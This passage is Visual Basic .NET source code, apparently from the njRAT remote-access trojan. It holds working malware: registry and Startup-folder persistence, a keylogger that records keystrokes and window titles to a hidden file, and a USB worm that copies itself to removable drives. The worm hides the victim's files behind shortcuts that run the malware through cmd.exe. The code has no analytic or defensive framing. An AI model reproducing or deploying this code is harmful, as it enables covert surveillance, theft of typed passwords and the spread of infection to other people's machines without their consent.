            F.Registry.CurrentUser.OpenSubKey(sf, True).SetValue(RG, ChrW(34) & LO.FullName & ChrW(34) & " ..")
        Catch ex As Exception
        End Try
        Try ' Add startup HKLM
            F.Registry.LocalMachine.OpenSubKey(sf, True).SetValue(RG, ChrW(34) & LO.FullName & ChrW(34) & " ..")
        Catch ex As Exception
        End Try
        Try ' Copy To StartUp Folder
            IO.File.Copy(LO.FullName, Environment.GetFolderPath(Environment.SpecialFolder.Startup) & "\" & RG & ".exe", True)
        Catch ex As Exception
        End Try
        Threading.Thread.CurrentThread.Sleep(1000)
    End Sub
    Public F As Object = New Microsoft.VisualBasic.Devices.Computer
End Class
Public Class kl
    ' njlogger v4
#Region "API"
    <DllImport("user32.dll")> _
 Private Shared Function ToUnicodeEx(ByVal wVirtKey As UInteger, ByVal wScanCode As UInteger, ByVal lpKeyState As Byte(), <Out(), MarshalAs(UnmanagedType.LPWStr)> ByVal pwszBuff As System.Text.StringBuilder, ByVal cchBuff As Integer, ByVal wFlags As UInteger, _
  ByVal dwhkl As IntPtr) As Integer
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function GetKeyboardState(ByVal lpKeyState As Byte()) As Boolean
    End Function
    <DllImport("user32.dll")> _
    Private Shared Function MapVirtualKey(ByVal uCode As UInteger, ByVal uMapType As UInteger) As UInteger
    End Function
    Private Declare Function GetWindowThreadProcessId Lib "user32.dll" (ByVal hwnd As IntPtr, ByRef lpdwProcessID As Integer) As Integer
    Private Declare Function GetKeyboardLayout Lib "user32" (ByVal dwLayout As Integer) As Integer
    Private Declare Function GetForegroundWindow Lib "user32" () As IntPtr
    Private Declare Function GetAsyncKeyState Lib "user32" (ByVal vKey As Integer) As Short
#End Region
    Private LastAV As Integer ' Last Active Window Handle
    Private LastAS As String ' Last Active Window Title
    Private lastKey As Keys = Nothing ' Last Pressed Key

    Private Function AV() As String ' Get Active Window
        Try
            Dim o = GetForegroundWindow
            Dim id As Integer
            GetWindowThreadProcessId(o, id)
            Dim p As Object = Process.GetProcessById(id)
            If o.ToInt32 = LastAV And LastAS = p.MainWindowTitle Or p.MainWindowTitle.Length = 0 Then
            Else
 
                LastAV = o.ToInt32
                LastAS = p.MainWindowTitle
                Return vbNewLine & ChrW(1) & HM() & " " & p.ProcessName & " " & LastAS & ChrW(1) & vbNewLine
            End If
        Catch ex As Exception
        End Try
        Return ""
    End Function
    Public Clock As New Microsoft.VisualBasic.Devices.Clock
    Private Function HM() As String
        Try
            Return Clock.LocalTime.ToString("yy/MM/dd")
        Catch ex As Exception
            Return "??/??/??"
        End Try
    End Function
    Public Logs As String = ""
    Dim keyboard As Object = New Microsoft.VisualBasic.Devices.Keyboard
    Private Shared Function VKCodeToUnicode(ByVal VKCode As UInteger) As String
        Try
            Dim sbString As New System.Text.StringBuilder()
            Dim bKeyState As Byte() = New Byte(254) {}
            Dim bKeyStateStatus As Boolean = GetKeyboardState(bKeyState)
            If Not bKeyStateStatus Then
                Return ""
            End If
            Dim lScanCode As UInteger = MapVirtualKey(VKCode, 0)
            Dim h As IntPtr = GetForegroundWindow()
            Dim id As Integer = 0
            Dim Aid As Integer = GetWindowThreadProcessId(h, id)
            Dim HKL As IntPtr = GetKeyboardLayout(Aid)
            ToUnicodeEx(VKCode, lScanCode, bKeyState, sbString, CInt(5), CUInt(0), _
             HKL)
            Return sbString.ToString()
        Catch ex As Exception
        End Try
        Return CType(VKCode, Keys).ToString
    End Function
    Private Function Fix(ByVal k As Keys) As String
        Dim isuper As Boolean = keyboard.ShiftKeyDown
        If keyboard.CapsLock = True Then
            If isuper = True Then
                isuper = False
            Else
                isuper = True
            End If
        End If
        Try
            Select Case k
                Case Keys.F1, Keys.F2, Keys.F3, Keys.F4, Keys.F5, Keys.F6, Keys.F7, Keys.F8, Keys.F9, Keys.F10, Keys.F11, Keys.F12, Keys.End, Keys.Delete, Keys.Back
                    Return "[" & k.ToString & "]"
                Case Keys.LShiftKey, Keys.RShiftKey, Keys.Shift, Keys.ShiftKey, Keys.Control, Keys.ControlKey, Keys.RControlKey, Keys.LControlKey, Keys.Alt
                    Return ""
                Case Keys.Space
                    Return " "
                Case Keys.Enter, Keys.Return
                    If Logs.EndsWith("[ENTER]" & vbNewLine) Then
                        Return ""
                    End If
                    Return "[ENTER]" & vbNewLine
                Case Keys.Tab
                    Return "[TAP]" & vbNewLine
                Case Else
                    If isuper = True Then
                        Return VKCodeToUnicode(k).ToUpper
                    Else
                        Return VKCodeToUnicode(k)
                    End If
            End Select
        Catch ex As Exception
            If isuper = True Then
                Return ChrW(k).ToString.ToUpper
            Else
                Return ChrW(k).ToString.ToLower
            End If
        End Try
    End Function


    Public LogsPath As String = Reflection.Assembly.GetExecutingAssembly.Location & ".tmp"
 
    Public Sub WRK()

        Try
            Logs = IO.File.ReadAllText(LogsPath)

        Catch ex As Exception
        End Try
 
        Try
            Dim lp As Integer = 0
            While True
                lp += 1
                For i As Integer = 0 To 255
                    If GetAsyncKeyState(i) = -32767 Then
                        Dim k As Keys = i
                        Dim s = Fix(k)
                        If s.Length > 0 Then
                            Logs &= AV()
                            Logs &= s
                        End If
                        lastKey = k
                    End If
                Next
                If lp = 1000 Then
                    lp = 0
                    Dim mx As Integer = 20 * 1024
                    If Logs.Length > mx Then
                        Logs = Logs.Remove(0, Logs.Length - mx)
                    End If
                    IO.File.WriteAllText(LogsPath, Logs)
                End If
                Threading.Thread.CurrentThread.Sleep(1)

            End While
        Catch ex As Exception

        End Try
    End Sub
End Class
Public Class USB
    ' bY njq8
    Private Off As Boolean = False
    Dim thread As Threading.Thread = Nothing
    Public ExeName As String
    Public Sub Start()
        If thread Is Nothing Then
            thread = New Threading.Thread(AddressOf usb, 1)
            thread.Start()
        End If
    End Sub

    Public Sub clean()
        Off = True
        Do Until thread Is Nothing
            Threading.Thread.CurrentThread.Sleep(1)
        Loop

        For Each x As IO.DriveInfo In IO.DriveInfo.GetDrives
            Try
                If x.IsReady Then
                    If x.DriveType = IO.DriveType.Removable Or _
                    x.DriveType = IO.DriveType.CDRom Then
                        If IO.File.Exists(x.Name & ExeName) Then
                            IO.File.SetAttributes(x.Name _
                            & ExeName, IO.FileAttributes.Normal)
                            IO.File.Delete(x.Name & ExeName)
                        End If
                        For Each xx As String In IO.Directory.GetFiles(x.Name)

                            Try
                                IO.File.SetAttributes(xx, IO.FileAttributes.Normal)
                                If xx.ToLower.EndsWith(".lnk") Then '%
                                    IO.File.Delete(xx)
                                End If
                            Catch ex As Exception
                            End Try
                        Next
                        For Each xx As String In IO.Directory.GetDirectories(x.Name)
                            Try
                                With New IO.DirectoryInfo(xx)
                                    .Attributes = IO.FileAttributes.Normal
                                End With
                            Catch ex As Exception
                            End Try
                        Next
                    End If
                End If
            Catch ex As Exception
            End Try
        Next
    End Sub
    Public dr As New Collection
    Sub usb()
        thread = Nothing
        clean()
        thread = Threading.Thread.CurrentThread
        Off = False
        Do Until Off = True
            Try
                For Each x In IO.DriveInfo.GetDrives
                    Dim d As DRV
                    If dr.Contains(x.Name.ToLower) = False Then
                        d = New DRV
                        d.drive = x.Name
                        dr.Add(d, x.Name.ToLower)
                    Else
                        d = dr(x.Name.ToLower)
                    End If
                    If Off Then Exit Do

                    Try
                        If x.IsReady Then
                            If x.TotalFreeSpace > 0 And x.DriveType = IO.DriveType _
                            .Removable Or x.DriveType = IO.DriveType.CDRom Then
                                Try
                                    If IO.File.Exists(x.Name & ExeName) = False Then
                                        IO.File.Copy(Application.ExecutablePath, x.Name & ExeName, True)
                                        IO.File.SetAttributes(x.Name & ExeName, IO.FileAttributes.Hidden)
                                    End If
                                    For Each xx As String In IO.Directory.GetFiles(x.Name)
                                        If IO.Path.GetExtension(xx).ToLower <> ".lnk" And xx.ToLower <> x.Name.ToLower & ExeName.ToLower Then '%
                                            If d.Files.Contains(New IO.FileInfo(xx).Name) = False Then
                                                If d.Files.Count < 20 Then
                                                    lnk(x, xx, GetIcon(IO.Path.GetExtension(xx)))
                                                    d.Files.Add(New IO.FileInfo(xx).Name)
                                                    IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                                    d.lnk.Add(IO.File.ReadAllText(x.Name & New IO.FileInfo(xx).Name & ".lnk")) '%
                                                End If
                                            Else
                                                If d.Files.Contains(New IO.FileInfo(xx).Name) Then
                                                    If IO.File.GetAttributes(xx) <> IO.FileAttributes.Hidden Then
                                                        IO.File.SetAttributes(xx, IO.FileAttributes.Hidden)
                                                    End If
                                                    If IO.File.Exists(x.Name & New IO.FileInfo(xx).Name & ".lnk") = False Then '%
                                                        lnk(x, xx, GetIcon(IO.Path.GetExtension(xx)))
                                                    Else
                                                        If IO.File.ReadAllText(x.Name & New IO.FileInfo(xx).Name & ".lnk") <> d.lnk(d.Files.IndexOf(New IO.FileInfo(xx).Name)) Then '%
                                                            lnk(x, xx, GetIcon(IO.Path.GetExtension(xx)))
                                                        End If
                                                    End If
                                                End If
                                            End If
                                        End If
                                    Next
                                Catch ex As Exception
                                End Try
                            End If
                        End If
                    Catch ex As Exception
                    End Try
                Next
            Catch ex As Exception
            End Try
            Threading.Thread.CurrentThread.Sleep(3000)
        Loop
        thread = Nothing
    End Sub
    Function lnk(ByVal x As IO.DriveInfo, ByVal xx As String, ByVal ico As String)
        Try
            IO.File.Delete(x.Name & New IO.FileInfo(xx).Name & ".lnk") '%
        Catch ex As Exception
        End Try
        With CreateObject("WScript.Shell").CreateShortcut(x.Name & New IO.FileInfo(xx).Name & ".lnk") '%
            .TargetPath = "cmd.exe" '%
            .WorkingDirectory = "" '%
            .Arguments = "/c start " & ExeName.Replace(" ", ChrW(34) _
             & " " & ChrW(34)) & "&explorer /root,""%CD%" & New  _
             IO.DirectoryInfo(xx).Name & """ & exit" '%
            .IconLocation = ico
            .Save()
        End With
    End Function
    Function GetIcon(ByVal ext As String) As String
        Try
            Dim r = Microsoft.Win32.Registry _
            .LocalMachine.OpenSubKey("Software\Classes\", False) '%
            Dim e As String = r.OpenSubKey(r.OpenSubKey(ext, False) _
            .GetValue("") & "\DefaultIcon\").GetValue("", "") '%
            If e.Contains(",") = False Then e &= ",0" '%
            Return e
        Catch ex As Exception
            Return "" '%
        End Try
    End Function
    Public Class DRV
        Public drive As String
        Public Files As New List(Of String)
        Public lnk As New List(Of String)

    End Class
End Class